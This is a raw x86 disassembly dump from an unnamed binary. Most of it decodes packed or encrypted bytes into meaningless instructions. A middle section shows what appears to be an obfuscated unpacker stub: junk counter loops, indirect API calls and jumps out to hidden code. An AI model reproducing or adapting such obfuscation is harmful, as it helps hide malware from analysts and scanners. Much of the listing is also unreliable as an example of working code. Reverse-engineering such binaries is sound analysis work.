  413248:	add    eax,0xbff159a2
  41324d:	xor    ah,BYTE PTR ds:0x60c10d6b
  413253:	cmp    eax,0xd6af2cf9
  413258:	pusha  
  413259:	cmp    edi,DWORD PTR [edx-0xe]
  41325c:	add    ebp,0xffffffa5
  41325f:	inc    edi
  413260:	shl    DWORD PTR ds:0x3cbd65e3,1
  413266:	push   ecx
  413267:	sti    
  413268:	and    eax,0x80022a0c
  41326d:	addr16 jg 0x413290
  413270:	dec    edi
  413271:	and    eax,0x96901930
  413276:	adc    eax,0x3221235f
  41327b:	add    edi,esi
  41327d:	dec    edx
  41327e:	stos   DWORD PTR es:[edi],eax
  41327f:	mov    ecx,0x35633a3a
  413284:	mov    ds:0x5b882bf7,eax
  413289:	sbb    dh,BYTE PTR [edi-0x7be731db]
  41328f:	dec    ebp
  413290:	sahf   
  413291:	imul   ebx,DWORD PTR [eax+0x28],0xffffff9b
  413295:	and    dh,BYTE PTR [eax-0x2e]
  413298:	push   esi
  413299:	icebp  
  41329a:	fst    QWORD PTR [edx+0x36]
  41329d:	pop    ds
  41329e:	fcomip st,st(7)
  4132a0:	sahf   
  4132a1:	stos   BYTE PTR es:[edi],al
  4132a2:	cmp    cl,BYTE PTR [edx-0x26]
  4132a5:	mov    ebx,0xc2750b5
  4132aa:	pop    ebx
  4132ab:	loopne 0x4132e7
  4132ad:	aas    
  4132ae:	xchg   esp,eax
  4132af:	pop    edi
  4132b0:	add    al,0x9b
  4132b2:	jg     0x41323f
  4132b4:	xor    cl,BYTE PTR [esi+0x7]
  4132b7:	xor    eax,0xffffffb5
  4132ba:	mov    al,fs:0x362cf446
  4132c0:	(bad)  
  4132c1:	fs dec eax
  4132c3:	shr    BYTE PTR [esi-0x3882d8bb],1
  4132c9:	and    dh,BYTE PTR [esi-0x5d50df98]
  4132cf:	xor    eax,0x8ace541e
  4132d4:	fild   QWORD PTR [ebp-0x3e768c66]
  4132da:	es mov edx,0xd903983
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	leave  
  4132e2:	or     eax,0xe8a34a86
  4132e7:	imul   esp,DWORD PTR [ecx-0x6908b7c6],0x81302c67
  4132f1:	push   es
  4132f2:	inc    ebp
  4132f3:	sbb    ah,BYTE PTR [esi-0x74]
  4132f6:	in     eax,0xd2
  4132f8:	dec    edx
  4132f9:	bswap  esp
  4132fb:	dec    ebp
  4132fc:	pop    es
  4132fd:	(bad)  
  4132fe:	int3   
  4132ff:	or     eax,0x3336b391
  413304:	cmp    eax,0x1859e7ab
  413309:	sub    eax,0x4bc448e3
  41330e:	cmp    eax,0x581a41ec
  413313:	pop    es
  413314:	sbb    al,0xbe
  413316:	and    ebp,DWORD PTR [ecx]
  413318:	and    eax,0xb21537c0
  41331d:	mov    al,ds:0x547773c8
  413323:	stos   BYTE PTR es:[edi],al
  413324:	push   edx
  413325:	add    BYTE PTR [edi+0x15c76b5b],0x41
  41332c:	xchg   esi,eax
  41332d:	repnz inc edx
  41332f:	dec    eax
  413330:	sbb    BYTE PTR [esi-0xc],dl
  413333:	pop    edx
  413334:	adc    BYTE PTR [eax+0x339cc7a7],dl
  41333a:	jle    0x413300
  41333c:	nop
  41333d:	mov    DWORD PTR [edx],ecx
  41333f:	mov    DWORD PTR ds:0x420e8e,0x16
  413349:	cmp    DWORD PTR ds:0x420e8e,0x0
  413350:	je     0x4133a5
  413356:	cmp    DWORD PTR ds:0x420e8e,0x2
  41335d:	jne    0x413373
  413363:	push   0x4d61
  413368:	push   0x424000
  41336d:	call   DWORD PTR ds:0x4247fd
  413373:	cmp    DWORD PTR ds:0x420e8e,0x3
  41337a:	jne    0x41338d
  413380:	mov    ecx,DWORD PTR ds:0x420e8e
  413386:	dec    ecx
  413387:	mov    DWORD PTR ds:0x420e8e,ecx
  41338d:	mov    ecx,DWORD PTR ds:0x420e8e
  413393:	dec    ecx
  413394:	mov    DWORD PTR ds:0x420e8e,ecx
  41339a:	jmp    0x413349
  41339f:	sbb    ecx,0x253c
  4133a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4133a8:	and    DWORD PTR ds:0x42201c,0x420efc
  4133b2:	xor    ecx,eax
  4133b4:	adc    DWORD PTR ds:0x420f70,0x420ef8
  4133be:	add    ecx,esi
  4133c0:	mov    DWORD PTR [ebp-0x20],ecx
  4133c3:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  4133ca:	mov    ecx,DWORD PTR ds:0x420eec
  4133d0:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4133d7:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  4133de:	mov    ecx,0x748f
  4133e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4133e6:	mov    DWORD PTR [ebp+0x8],ecx
  4133e9:	mov    DWORD PTR ds:0x420f68,0x5b27
  4133f3:	jmp    0x413647
  4133f8:	xor    DWORD PTR ds:0x422008,edx
  4133fe:	mov    ecx,DWORD PTR [ebp+0x8]
  413401:	sub    DWORD PTR ds:0x420fa8,0x420ef8
  41340b:	mov    edx,DWORD PTR [ebp-0x8]
  41340e:	sub    DWORD PTR ds:0x420e86,0x420f98
  413418:	xor    ecx,eax
  41341a:	sbb    DWORD PTR ds:0x420f60,0x61d9
  413424:	xor    edx,eax
  413426:	xor    DWORD PTR ds:0x420f04,0x2d2e
  413430:	sub    ecx,edx
  413432:	sub    ecx,esi
  413434:	xor    ecx,eax
  413436:	and    DWORD PTR ds:0x420e9e,0x0
  413440:	mov    edx,DWORD PTR ds:0x420e9e
  413446:	inc    edx
  413447:	mov    DWORD PTR ds:0x420e9e,edx
  41344d:	cmp    DWORD PTR ds:0x420e9e,0x5
  413454:	jne    0x41346d
  41345a:	push   0x4241e6
  41345f:	push   0x1
  413461:	push   DWORD PTR [ebp-0x10]
  413464:	push   DWORD PTR [ebp-0x28]
  413467:	call   DWORD PTR ds:0x424801
  41346d:	cmp    DWORD PTR ds:0x420e9e,0x4
  413474:	jne    0x413487
  41347a:	mov    edx,DWORD PTR ds:0x420e9e
  413480:	inc    edx
  413481:	mov    DWORD PTR ds:0x420e9e,edx
  413487:	cmp    DWORD PTR ds:0x420e9e,0x18
  41348e:	jb     0x413440
  413494:	mov    DWORD PTR [ebp+0x8],ecx
  413497:	dec    edx
  413498:	mov    ecx,DWORD PTR [ebp+0x8]
  41349b:	add    edx,DWORD PTR ds:0x420e92
  4134a1:	mov    edx,DWORD PTR [ebp-0x64]
  4134a4:	add    DWORD PTR ds:0x420fa8,0x502e
  4134ae:	lea    ecx,[edx+ecx*1+0x5708f2]
  4134b5:	and    DWORD PTR ds:0x420f64,0x0
  4134bf:	mov    edx,DWORD PTR ds:0x420f64
  4134c5:	inc    edx
  4134c6:	mov    DWORD PTR ds:0x420f64,edx
  4134cc:	cmp    DWORD PTR ds:0x420f64,0x1a
  4134d3:	jne    0x4134e7
  4134d9:	push   0x420f04
  4134de:	push   DWORD PTR [ebp-0x24]
  4134e1:	call   DWORD PTR ds:0x424805
  4134e7:	cmp    DWORD PTR ds:0x420f64,0x15
  4134ee:	jb     0x4134bf
  4134f4:	or     DWORD PTR ds:0x422008,0x1488
  4134fe:	mov    DWORD PTR [ebp-0x64],ecx
  413501:	mov    ecx,DWORD PTR [ebp+0x8]
  413504:	mov    edx,DWORD PTR [ebp-0x60]
  413507:	lea    ecx,[edx+ecx*1+0x5708f2]
  41350e:	mov    DWORD PTR [ebp-0x60],ecx
  413511:	mov    ecx,DWORD PTR [ebp+0x8]
  413514:	mov    edx,DWORD PTR ds:0x422000
  41351a:	adc    DWORD PTR ds:0x420fa4,edx
  413520:	mov    edx,DWORD PTR [ebp-0x5c]
  413523:	sbb    DWORD PTR ds:0x420fa4,0x6605
  41352d:	lea    ecx,[edx+ecx*1+0x5708f3]
  413534:	and    DWORD PTR ds:0x420f5c,0x0
  41353e:	jmp    0x413552
  413543:	xor    edx,edx
  413545:	xor    edx,DWORD PTR ds:0x420f5c
  41354b:	inc    edx
  41354c:	mov    DWORD PTR ds:0x420f5c,edx
  413552:	cmp    DWORD PTR ds:0x420f5c,0x13
  413559:	jae    0x4135ab
  41355f:	cmp    DWORD PTR ds:0x420f5c,0x5
  413566:	jne    0x41358a
  41356c:	push   DWORD PTR [ebp-0x20]
  41356f:	push   0x420f04
  413574:	push   DWORD PTR [ebp-0x20]
  413577:	push   0x4240b9
  41357c:	push   0x1238
  413581:	push   DWORD PTR [ebp-0xc]
  413584:	call   DWORD PTR ds:0x42480d
  41358a:	cmp    DWORD PTR ds:0x420f5c,0x4
  413591:	jne    0x4135a4
  413597:	mov    edx,DWORD PTR ds:0x420f5c
  41359d:	inc    edx
  41359e:	mov    DWORD PTR ds:0x420f5c,edx
  4135a4:	jmp    0x413543
  4135a9:	neg    edx
  4135ab:	mov    DWORD PTR [ebp-0x5c],ecx
  4135ae:	and    DWORD PTR ds:0x420fa4,0x0
  4135b8:	mov    edx,DWORD PTR ds:0x420fa4
  4135be:	inc    edx
  4135bf:	mov    DWORD PTR ds:0x420fa4,edx
  4135c5:	cmp    DWORD PTR ds:0x420fa4,0x20
  4135cc:	jne    0x4135d8
  4135d2:	call   DWORD PTR ds:0x424811
  4135d8:	cmp    DWORD PTR ds:0x420fa4,0x18
  4135df:	jb     0x4135b8
  4135e5:	adc    edx,0x1b19
  4135eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4135ee:	mov    edx,DWORD PTR [ebp-0x58]
  4135f1:	lea    ecx,[edx+ecx*1+0x5708f0]
  4135f8:	xor    edx,DWORD PTR ds:0x420f08
  4135fe:	mov    DWORD PTR [ebp-0x58],ecx
  413601:	mov    ecx,DWORD PTR [ebp+0x8]
  413604:	xor    DWORD PTR ds:0x420f64,0x420eec
  41360e:	mov    edx,DWORD PTR [ebp-0x54]
  413611:	lea    ecx,[edx+ecx*1+0x5708f1]
  413618:	add    DWORD PTR ds:0x420f08,ebx
  41361e:	mov    DWORD PTR [ebp-0x54],ecx
  413621:	or     ecx,DWORD PTR ds:0x422018
  413627:	mov    ecx,DWORD PTR [ebp+0x8]
  41362a:	mov    edx,DWORD PTR [ebp-0x50]
  41362d:	inc    DWORD PTR ds:0x420f00
  413633:	lea    ecx,[edx+ecx*1+0x5708fe]
  41363a:	and    DWORD PTR ds:0x420e9a,0x420f6c
  413644:	mov    DWORD PTR [ebp-0x50],ecx
  413647:	inc    ecx
  413648:	mov    ecx,DWORD PTR [ebp+0x8]
  41364b:	adc    DWORD PTR ds:0x420ea2,0x68a
  413655:	xor    ecx,eax
  413657:	and    DWORD PTR ds:0x420e8e,0x1a66
  413661:	add    ecx,esi
  413663:	mov    DWORD PTR ds:0x420e92,0x4bef
  41366d:	jne    0x4133f8
  413673:	jmp    0x420dd1
  413678:	mov    ecx,DWORD PTR [ebp-0x1c]
  41367b:	mov    edx,DWORD PTR ds:0x423008
  413681:	mov    edx,DWORD PTR [edx]
  413683:	sub    DWORD PTR ds:0x420fb4,edx
  413689:	mov    edx,DWORD PTR [ebp-0x8]
  41368c:	xor    DWORD PTR ds:0x420f04,0x3196
  413696:	xor    ecx,eax
  413698:	xor    edx,eax
  41369a:	sbb    DWORD PTR ds:0x422000,0x24d3
  4136a4:	sub    ecx,edx
  4136a6:	xor    DWORD PTR ds:0x420e82,0x420e8a
  4136b0:	sub    ecx,esi
  4136b2:	xor    ecx,eax
  4136b4:	mov    DWORD PTR [ebp-0x1c],ecx
  4136b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4136ba:	mov    DWORD PTR [ebp+0x8],ecx
  4136bd:	jmp    0x4136ef
  4136c2:	mov    ecx,DWORD PTR [ebp+0x8]
  4136c5:	mov    edx,DWORD PTR [ebp-0x8]
  4136c8:	xor    ecx,eax
  4136ca:	xor    edx,eax
  4136cc:	sub    ecx,edx
  4136ce:	sub    ecx,esi
  4136d0:	xor    ecx,eax
  4136d2:	mov    DWORD PTR [ebp+0x8],ecx
  4136d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4136d8:	mov    edx,DWORD PTR [ebp+0x8]
  4136db:	imul   edx,edx,0x5708f2
  4136e1:	xor    ecx,eax
  4136e3:	add    ecx,esi
  4136e5:	lea    ecx,[ebp+ecx*4-0x64]
  4136e9:	mov    edi,DWORD PTR [ecx]
  4136eb:	add    edx,edi
  4136ed:	mov    DWORD PTR [ecx],edx
  4136ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4136f2:	xor    ecx,eax
  4136f4:	jmp    0x415a81
  4136f9:	js     0x4136a4
  4136fb:	inc    edx
  4136fc:	iret   
  4136fd:	aaa    
  4136fe:	jae    0x41377b
  413700:	test   eax,0x7e5a8e7d
  413705:	push   ecx
  413706:	mov    BYTE PTR [edi+0x7a73be64],bl
  41370c:	jp     0x413718
  41370e:	pop    edi
  41370f:	jp     0x41378b
  413711:	adc    ecx,esp
  413713:	add    esp,DWORD PTR ss:[ebp+0x56]
  413717:	xchg   BYTE PTR [ebp+0x4c],dl
  41371a:	inc    ebx
  41371b:	rol    BYTE PTR [edi-0x60],0xeb
  41371f:	fst    DWORD PTR [ebp-0x60]
  413722:	add    eax,0xf3de9ebc
  413727:	dec    esi
  413728:	cdq    
  413729:	or     al,0x15
  41372b:	lahf   
  41372c:	mov    dh,ch
  41372e:	sbb    dl,BYTE PTR ss:[esi+0x7d]
  413732:	cs mov bl,0x7
  413735:	pop    ebp
  413736:	and    eax,0x4bd10da8
  41373b:	loop   0x4136cd
  41373d:	lods   eax,DWORD PTR ds:[esi]
  41373e:	lea    ecx,[edi+edx*2-0xde7b335]
  413745:	and    DWORD PTR [edi-0x763b53],esp
  41374b:	pushf  
  41374c:	pop    ss
  41374d:	xchg   ebp,eax
  41374e:	sbb    ecx,DWORD PTR [ecx-0x33]
  413751:	enter  0xece2,0xbc
  413755:	sbb    DWORD PTR [esp+eax*4+0x29],ebp
  413759:	call   0xe151:0x43c3cd9b
  413760:	mov    eax,0x5f942bff
  413765:	push   ebx
  413766:	in     eax,dx
  413767:	pushf  
  413768:	sbb    eax,0xce0e5558
  41376d:	stos   BYTE PTR es:[edi],al
  41376e:	mov    eax,ds:0x7432d4aa
  413773:	jnp    0x4137ea
  413775:	call   0x3c99:0x7fb0c79b
  41377c:	pop    es
  41377d:	pop    edx
  41377e:	loopne 0x413745
  413780:	add    DWORD PTR [ecx+0x2158854c],0xffffffac
  413787:	adc    al,0x6e
  413789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41378a:	and    DWORD PTR [ebx],eax
  41378c:	ret    
  41378d:	jb     0x4137a1
  41378f:	inc    eax
  413790:	imul   ebx,DWORD PTR [esi+0x2f],0x855bcfe6
  413797:	(bad)  
  41379a:	sar    BYTE PTR [esi+0x41],cl
  41379d:	mov    eax,DWORD PTR [edi-0x1b]
  4137a0:	out    0xa0,al
  4137a2:	pop    ebp
  4137a3:	mov    bh,0x59
  4137a5:	pop    edx
  4137a6:	add    esp,eax
  4137a8:	xchg   ecx,eax
  4137a9:	or     DWORD PTR [edx],0xffffffb3
  4137ac:	jne    0x413812
  4137ae:	fmul   DWORD PTR [ecx-0x3ecc4854]
  4137b4:	stc    
  4137b5:	dec    esp
  4137b6:	pop    ss
  4137b7:	sub    al,0x4d
  4137b9:	inc    ecx
  4137ba:	push   0x29
  4137bc:	mov    bh,0xb2
  4137be:	mov    dh,0x75
  4137c0:	cmc    
  4137c1:	xlat   BYTE PTR ds:[ebx]
  4137c2:	mov    DWORD PTR [edi],edx
  4137c4:	cmp    BYTE PTR [esi-0xf83f9db],ah
  4137ca:	push   eax
  4137cb:	jge    0x413837
  4137cd:	and    al,BYTE PTR ds:0xc32459f8
  4137d3:	popf   
  4137d4:	pop    ebx
  4137d5:	sti    
  4137d6:	nop
  4137d7:	push   ds
  4137d8:	push   esi
  4137d9:	jne    0x4137ce
  4137db:	and    ebp,esp
  4137dd:	ds scas eax,DWORD PTR es:[edi]
  4137df:	loopne 0x4137d4
  4137e1:	xlat   BYTE PTR ds:[ebx]
  4137e2:	push   ecx
  4137e3:	fstp   TBYTE PTR [esi-0x7]
  4137e6:	cmp    dl,bl
  4137e8:	mov    edi,0x16e8f352
  4137ed:	mov    al,0x6c
  4137ef:	cmp    DWORD PTR [ecx-0x22],ebp
  4137f2:	gs int 0x76
  4137f5:	neg    bh
  4137f7:	je     0x4137b8
  4137f9:	adc    dl,bl
  4137fb:	jbe    0x41386a
  4137fd:	mov    esp,0x85c78f89
  413802:	divps  xmm4,xmm0
  413805:	ror    BYTE PTR [eax+0x6a3512b2],0x2
  41380c:	imul   edi,DWORD PTR [ebx-0x8b8580a],0xb270ba26
  413816:	pop    edx
  413817:	jmp    0xe54e02c9
  41381c:	sub    DWORD PTR [esi-0x27d9a1ad],ebp
  413822:	sub    dh,dh
  413824:	mov    eax,ds:0xf3ae22b0
  413829:	push   esi
  41382a:	div    BYTE PTR [edi-0x58c4e209]
  413830:	icebp  
  413831:	adc    DWORD PTR [ebx],eax
  413833:	iret   
  413834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413835:	cs inc eax
  413837:	mov    bh,0x35
  413839:	call   0x380f:0x745fdf2b
  413840:	loopne 0x413832
  413842:	stos   BYTE PTR es:[edi],al
  413843:	and    BYTE PTR [ebx+0x3c3b56ad],bh
  413849:	test   DWORD PTR [edi+0x4479c582],0x1b04b086
  413853:	xor    bh,bh
  413855:	jge    0x413853
  413857:	adc    ebp,DWORD PTR [ebx-0x30cc73a8]
  41385d:	inc    ebx
  41385e:	add    eax,0xd0799b91
  413863:	scas   al,BYTE PTR es:[edi]
  413864:	das    
  413865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413866:	adc    dl,BYTE PTR [edx-0x29]
  413869:	adc    dh,dl
  41386b:	push   ds
  41386c:	xor    ch,bh
  41386e:	test   BYTE PTR [ebx+ecx*1+0x7],dh
  413872:	mov    bh,0xfb
  413874:	(bad)
  413877:	dec    esp
  413878:	xchg   ebx,eax
  413879:	and    ebp,ebx
  41387b:	or     ecx,eax
  41387d:	jl     0x4138ad
  41387f:	inc    esi
  413880:	xchg   ebx,eax
  413881:	test   DWORD PTR [edx-0x70992d51],esp
  413887:	add    ch,BYTE PTR [ecx-0x1e2e521b]
  41388d:	xchg   ecx,eax
  41388e:	jo     0x413845
  413890:	xchg   ecx,eax
  413891:	pop    esi
  413892:	mov    edi,0x3a0de2c8
  413897:	lock sti 
  413899:	and    DWORD PTR [eax+0x59c0a5ee],ebx
  41389f:	or     eax,0x3a8217bc
  4138a4:	psubsb mm1,QWORD PTR [edx+0x4dd3b1e7]
  4138ab:	fwait
  4138ac:	mov    dh,0x5d
  4138ae:	fsubr  DWORD PTR [edx+0x2e]
  4138b1:	out    dx,eax
  4138b2:	mov    edi,0x1b234c05
  4138b7:	mov    al,ds:0xe786ec56
  4138bc:	mov    esp,0xed95d41f
  4138c1:	jge    0x413889
  4138c3:	sbb    al,0x22
  4138c5:	push   cs
  4138c6:	mov    esi,0x19d5040b
  4138cb:	push   es
  4138cc:	inc    ebp
  4138cd:	mov    ebx,ecx
  4138cf:	inc    esp
  4138d0:	pop    es
  4138d1:	rep lods eax,DWORD PTR ds:[esi]
  4138d3:	lahf   
  4138d4:	int    0x45
  4138d6:	retf   
  4138d7:	test   al,0x12
  4138d9:	ds out dx,eax
  4138db:	mov    eax,0x2631fb16
  4138e0:	mov    ebp,DWORD PTR [ebx+0x68f9cb33]
  4138e6:	adc    edx,DWORD PTR [edi]
  4138e8:	cmp    ecx,DWORD PTR [ebp-0x17f6cc1]
  4138ee:	daa    
  4138ef:	je     0x41393f
  4138f1:	and    eax,DWORD PTR [edx]
  4138f3:	pop    esp
  4138f4:	ret    
  4138f5:	adc    BYTE PTR [eax+0x5824deb7],0xa6
  4138fc:	jmp    0x4138fe
  4138fe:	and    eax,0xd0ecbaa0
  413903:	cmp    eax,0x6fc5acf2
  413908:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41390a:	jbe    0x4138a8
  41390c:	dec    BYTE PTR [esi+0x1db18986]
  413912:	xchg   edi,eax
  413913:	cmp    ah,BYTE PTR [edi]
  413915:	stos   DWORD PTR es:[edi],eax
  413916:	jg     0x4138b0
  413918:	cmc    
  413919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391a:	jecxz  0x41397f
  41391c:	call   0xfd55e43c
  413921:	pushf  
  413922:	rol    BYTE PTR [ebx+0x38],1
  413925:	lock adc eax,0x2ae40ef7
  41392b:	lahf   
  41392c:	push   esp
  41392d:	js     0x4139ae
  41392f:	lahf   
  413930:	cmp    dl,cl
  413932:	enter  0xd510,0xe6
  413936:	pop    ds
  413937:	mov    DWORD PTR gs:[esi-0x52f8e14f],edx
  41393e:	mov    bh,0xf6
  413940:	stos   DWORD PTR es:[edi],eax
  413941:	inc    ebx
  413942:	shl    DWORD PTR [eax],1
  413944:	adc    ebp,ebp
  413946:	mov    edx,0xbcb41482
  41394b:	jno    0x413946
  41394d:	xchg   ecx,eax
  41394e:	mov    cl,0x4c
  413950:	je     0x413948
  413952:	in     al,dx
  413953:	ja     0x413984
  413955:	mov    dl,0x68
  413957:	out    0x6e,al
  413959:	adc    eax,0xc3dff194
  41395e:	subps  xmm5,xmm5
  413961:	imul   eax,edi,0x5a49687a
  413967:	aaa    
  413968:	ins    DWORD PTR es:[edi],dx
  413969:	dec    ebp
  41396a:	lds    esi,FWORD PTR [ebx]
  41396c:	mov    ah,0x34
  41396e:	adc    al,0x77
  413970:	inc    DWORD PTR [edx-0x57]
  413973:	sub    al,0x41
  413975:	mov    ebx,DWORD PTR [edi+0xcf49807]
  41397b:	pop    esp
  41397c:	popf   
  41397d:	xor    al,0xe3
  41397f:	mov    ebx,?
  413981:	add    eax,0xaa7672bd
  413986:	test   BYTE PTR [ecx+0x74376ce6],0xf2
  41398d:	fcomip st,st(6)
  41398f:	pop    ebx
  413990:	mov    dl,BYTE PTR [ebx+ebx*8]
  413993:	push   cs
  413994:	push   0xffffffd3
  413996:	xor    al,BYTE PTR [ebx+esi*1+0x28]
  41399a:	push   esi
  41399b:	mov    BYTE PTR [ebx+eax*4+0x2b],0xd0
  4139a0:	bound  ecx,QWORD PTR [edx]
  4139a2:	push   ebx
  4139a3:	cs out dx,al
  4139a5:	lock mov cl,0xee
  4139a8:	clc    
  4139a9:	imul   edi,DWORD PTR [ecx+0x11],0x4bdc782c
  4139b0:	sub    al,dh
  4139b2:	cmc    
  4139b3:	jnp    0x4139d8
  4139b5:	mov    ebp,0xef0ffc50
  4139ba:	ret    0x423c
  4139bd:	inc    ecx
  4139be:	fwait
  4139bf:	pop    ebp
  4139c0:	hlt    
  4139c1:	and    esp,DWORD PTR [ecx+0x68]
  4139c4:	sbb    esi,DWORD PTR [eax-0x6c]
  4139c7:	loope  0x41396f
  4139c9:	das    
  4139ca:	mov    edi,0x93b85904
  4139cf:	lds    esp,FWORD PTR ds:0xeb6b4894
  4139d5:	inc    ecx
  4139d6:	fadd   st(0),st
  4139d8:	retf   
  4139d9:	fdiv   QWORD PTR [ecx]
  4139db:	cli    
  4139dc:	pop    esi
  4139dd:	pop    eax
  4139de:	pop    ds
  4139df:	or     ah,BYTE PTR ds:0xcbf45f09
  4139e5:	or     esi,DWORD PTR [ebp-0x74]
  4139e8:	outs   dx,DWORD PTR ds:[esi]
  4139e9:	push   ss
  4139ea:	and    dl,BYTE PTR [bx+si]
  4139ed:	pop    eax
  4139ee:	in     eax,0x91
  4139f0:	sahf   
  4139f1:	mov    ds:0x703ad81f,eax
  4139f6:	fiadd  DWORD PTR ds:0xb3159158
  4139fc:	nop
  4139fd:	cmp    DWORD PTR [eiz*1-0x19bf2d96],0xffffffa3
  413a05:	mov    al,0xe2
  413a07:	mov    al,0x2d
  413a09:	jmp    0x41c3:0x7b8dff55
  413a10:	adc    cl,0x4
  413a13:	mov    edi,0x871b30a0
  413a18:	push   ebp
  413a19:	neg    BYTE PTR [edi]
  413a1b:	cmp    eax,0xa5abacfe
  413a20:	sub    al,0x47
  413a22:	adc    DWORD PTR [ebx-0x704279fc],ebx
  413a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a29:	cld    
  413a2a:	add    BYTE PTR [ebp-0x16],cl
  413a2d:	cmp    BYTE PTR [ebp+0xa126608],bh
  413a33:	mov    al,dl
  413a35:	pop    edx
  413a36:	inc    eax
  413a37:	dec    ebx
  413a38:	fs mov ah,0x59
  413a3b:	xor    al,0x66
  413a3d:	stos   BYTE PTR es:[edi],al
  413a3e:	sbb    BYTE PTR [ebx+0x41b018f0],al
  413a44:	(bad)  [ecx+0x6188b427]
  413a4a:	jbe    0x4139fe
  413a4c:	in     eax,dx
  413a4d:	add    eax,0x6f811280
  413a52:	jmp    0x3bfa:0xf480dec2
  413a59:	ror    edi,cl
  413a5b:	lds    edi,FWORD PTR [esi-0x72d31ab5]
  413a61:	xor    eax,0x1ce25556
  413a66:	xchg   esi,eax
  413a67:	add    BYTE PTR [esi-0x1f],bh
  413a6a:	sub    al,0x98
  413a6c:	jl     0x413a77
  413a6e:	or     bh,dl
  413a70:	inc    edi
  413a71:	cmp    edx,DWORD PTR [ebp-0x1576aab3]
  413a77:	inc    edi
  413a78:	pusha  
  413a79:	loope  0x413ab0
  413a7b:	mov    dl,0x32
  413a7d:	shl    DWORD PTR [ebx+edi*2],cl
  413a80:	mov    edx,0xfdfc7c96
  413a85:	cmc    
  413a86:	fwait
  413a87:	inc    ecx
  413a88:	(bad)
  413a8c:	mov    bh,al
  413a8e:	loope  0x413a58
  413a90:	add    esp,DWORD PTR [ebx+0x38]
  413a93:	xlat   BYTE PTR ds:[ebx]
  413a94:	mov    al,0x1
  413a96:	push   ebx
  413a97:	lods   eax,DWORD PTR ds:[esi]
  413a98:	repz adc eax,0x644407c6
  413a9e:	dec    eax
  413a9f:	pop    ecx
  413aa0:	push   ecx
  413aa1:	(bad)  
  413aa2:	rol    BYTE PTR [ebp+edi*8-0x76],1
  413aa6:	pop    edx
  413aa7:	xor    esp,eax
  413aa9:	sbb    eax,0x97c0dcb4
  413aae:	add    DWORD PTR [edi+0x4a],ebx
  413ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ab2:	sub    BYTE PTR [esi+0x76a4ab4a],bh
  413ab8:	xchg   DWORD PTR [eax+0x5c98ef18],edx
  413abe:	inc    ebx
  413abf:	sbb    dl,ah
  413ac1:	out    0x4,al
  413ac3:	shr    DWORD PTR [esi+0xabc62ca],cl
  413ac9:	xor    BYTE PTR [edx],ah
  413acb:	je     0x413a91
  413acd:	add    eax,0x15a7e7ff
  413ad2:	mov    WORD PTR [eax],fs
  413ad4:	mov    ebx,ds
  413ad6:	xchg   ebp,eax
  413ad7:	mov    bh,0xef
  413ad9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  413adb:	push   edi
  413adc:	rcr    DWORD PTR [eax+0x589a6357],0x61
  413ae3:	adc    al,0x8d
  413ae5:	pop    ebx
  413ae6:	push   edx
  413ae7:	fld    st(6)
  413ae9:	imul   edx,esi,0xffffffb7
  413aec:	rcr    esp,cl
  413aee:	cmp    eax,esp
  413af0:	jne    0x413a81
  413af2:	fucomp st(0)
  413af4:	cmp    al,0xb9
  413af6:	out    dx,eax
  413af7:	cdq    
  413af8:	test   BYTE PTR [ebx-0x3a],ch
  413afb:	imul   edx,DWORD PTR [edx-0x25],0xe
  413aff:	mov    ds:0xbefcb3cc,al
  413b04:	inc    BYTE PTR [esi]
  413b06:	sbb    al,0x18
  413b08:	mov    al,ds:0x493f992a
  413b0d:	cld    
  413b0e:	retf   0x1d61
  413b11:	cdq    
  413b12:	mov    ebp,0xadb927d1
  413b17:	push   0xe6fbc81e
  413b1c:	sub    ecx,esp
  413b1e:	push   esp
  413b1f:	and    edi,DWORD PTR [edi-0xe]
  413b22:	jp     0x413abf
  413b24:	jo     0x413acc
  413b26:	mov    cl,0xdf
  413b28:	mov    eax,ds:0xd39d776b
  413b2d:	ret    0x4eac
  413b30:	xor    dl,BYTE PTR [edx+0x4f732cd3]
  413b36:	fnstcw WORD PTR ds:0xb686d50c
  413b3c:	in     al,dx
  413b3d:	dec    edi
  413b3e:	dec    esp
  413b3f:	dec    esi
  413b40:	test   BYTE PTR [eax+0x5b],al
  413b43:	xchg   esi,eax
  413b44:	bound  ebx,QWORD PTR [esi+edi*1-0x5d]
  413b48:	xchg   ecx,eax
  413b49:	push   0x66587ef5
  413b4e:	sbb    eax,0xd9026512
  413b53:	mov    WORD PTR [edi],ss
  413b55:	xor    al,0x8c
  413b57:	dec    BYTE PTR [ebp+0x63]
  413b5a:	cmp    DWORD PTR [ecx-0x677960a5],0x31
  413b61:	(bad)  
  413b62:	adc    ebp,eax
  413b64:	fldenv [eax-0x79e739d3]
  413b6a:	fisubr DWORD PTR [ecx+0x73]
  413b6d:	jnp    0x413b79
  413b6f:	mov    esp,0x885f60ba
  413b74:	std    
  413b75:	sbb    al,ah
  413b77:	popa   
  413b78:	jno    0x413b77
  413b7a:	sbb    esi,edi
  413b7c:	mov    DWORD PTR [edi+0x7977b09f],ecx
  413b82:	stos   DWORD PTR es:[edi],eax
  413b83:	test   eax,0x60f7c35f
  413b88:	jbe    0x413ba9
  413b8a:	xor    dl,BYTE PTR [eax]
  413b8c:	jns    0x413b25
  413b8e:	in     eax,dx
  413b8f:	outs   dx,BYTE PTR ds:[esi]
  413b90:	icebp  
  413b91:	test   BYTE PTR [esi-0x46],bh
  413b94:	xchg   BYTE PTR [edx+0xfb9fc89],bh
  413b9a:	in     eax,0xc7
  413b9c:	pop    eax
  413b9d:	repnz add ch,cl
  413ba0:	repnz pop ebp
  413ba2:	(bad)  
  413ba3:	mov    eax,0xae933c09
  413ba8:	dec    ebx
